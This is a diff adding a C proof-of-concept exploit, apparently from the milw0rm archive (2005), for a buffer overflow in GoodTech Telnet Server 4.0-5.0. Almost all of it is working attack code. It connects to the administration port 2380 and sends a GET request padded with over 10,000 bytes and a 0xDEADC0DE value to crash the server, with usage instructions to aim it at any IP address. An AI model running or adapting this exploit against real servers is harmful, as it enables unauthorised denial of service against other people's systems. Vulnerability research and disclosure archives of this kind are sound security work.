@@ -1,0 +1,94 @@
+/******************************************************************************************
+
+	GoodTech Telnet Server Buffer Overflow Crash POC
+	created by Komrade
+	e-mail:	unsecure(at)altervista(dot)org
+	web:	http://unsecure.altervista.org
+
+	Tested on GoodTech Telnet Server versions 4.0 - 5.0 (versions prior to 5.0.7)
+        on a Windows XP Professional sp2 operating system.
+
+	This exploit connects to the Administration server of GoodTech Telnet Server
+	(default port 2380) and sends a very long string (10040 bytes).
+	After the exploit is sent the Telnet Server will crash, trying to access
+	to a bad memory address: 0xDEADCODE.
+
+	Usage: gtscrash.exe "IP address"
+
+	Options:
+	"IP address"	The IP address of the computer running GoodTech Telnet Server
+
+*******************************************************************************************/
+
+#include <windows.h>
+#include <winsock.h>
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+
+	SOCKET sock;
+	struct sockaddr_in sock_addr;
+	WSADATA data;
+	WORD p;
+	p=MAKEWORD(2,0);
+	WSAStartup(p,&data);
+	int i, n, err;
+	unsigned char *mex;
+	char risp[4096];
+
+	printf("------------------------------------------------------------------------------\r\n");
+	printf("\tGoodTech Telnet Server Buffer Overflow Crash POC\r\n");
+	printf("\t\t\tcreated by Komrade\r\n\r\n");
+
+	printf("\t\te-mail: unsecure(at)altervista(dot)org\r\n");
+	printf("\t\tweb: http://unsecure.altervista.org\r\n");
+	printf("------------------------------------------------------------------------------\r\n\r\n");
+
+
+	if (argc < 2){
+		printf("Usage: gtscrash.exe \"IP address\"\r\n\r\n");
+		printf("Options:\r\n");
+		printf("IP address\tThe IP address of the computer running GoodTech Telnet Server\r\n");
+		exit(0);
+	}
+
+	mex =(unsigned char *) LocalAlloc(LMEM_FIXED, 12000);
+
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	sock_addr.sin_family=PF_INET;
+	sock_addr.sin_port=htons(2380); /* Administration web server port */
+	sock_addr.sin_addr.s_addr= inet_addr(argv[1]);
+
+	err = connect(sock,(struct sockaddr*)&sock_addr,sizeof(struct sockaddr));
+	if(err<0){
+		printf("Unable to connect() to %s\n", argv[1]);
+		exit(-1);
+	}
+
+	strcpy (mex, "GET /");
+
+	for(i = strlen(mex); i < 10032; i++)
+		mex[i]= 'a';
+	mex[i]=0;
+
+	strcat(mex, "\xDE\xC0\xAD\xDE"); /* Invalid IP address */
+	strcat(mex, "\r\n\r\n");
+
+	printf("Sending %d bytes.....\n\n", strlen(mex));
+	n=send(sock, mex , strlen(mex), 0);
+
+	n=recv(sock, risp, sizeof(risp), 0);
+	if (n < 0)
+		printf("GoodTech Telnet Server succesfully crashed!!\n");
+	else{
+		risp[n]=0;
+		printf("%s\n", risp);
+	}
+
+	closesocket(sock);
+	WSACleanup();
+	return 0;
+}
+
+// milw0rm.com [2005-03-15]
